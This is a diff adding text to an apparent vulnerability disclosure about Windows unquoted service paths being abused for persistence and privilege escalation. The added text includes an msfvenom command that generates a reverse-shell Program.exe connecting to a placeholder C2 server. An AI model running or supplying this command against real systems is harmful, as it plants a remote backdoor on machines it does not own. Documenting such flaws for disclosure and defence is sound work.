@@ -8,6 +8,15 @@ Tested on:
 
 
 
+For this Vulnerability to work the system in question will have to be compromised already, and a malicious file named Program.exe placed in the C:\ folder. This Vulnerability 
+could allow an attacker to do almost anything. It all depends on the malicious program and the permissions it gains from unquoted paths being called. For instance an attacker could use MSFvenom to make a reverse shell, this would allow an attacker to maintain presistance on the system by acting as a back door. 
+
+msfvenom p windows/shell_reverse_tcp LHOST=[C2 server] LPORT=4444 -f exe > Program.exe
+
+And depending on the permissions used to call that unquoted path it may even give me elevated permissions. 
+
+
+
 Validated: 
 Program.exe - will catch the issue when it calls program.exe, source code can be found at https://github.com/ciwen3/Public/tree/master/C++/Unquoted-Path-Vuln
 wmic process where name='program.exe' get commandline
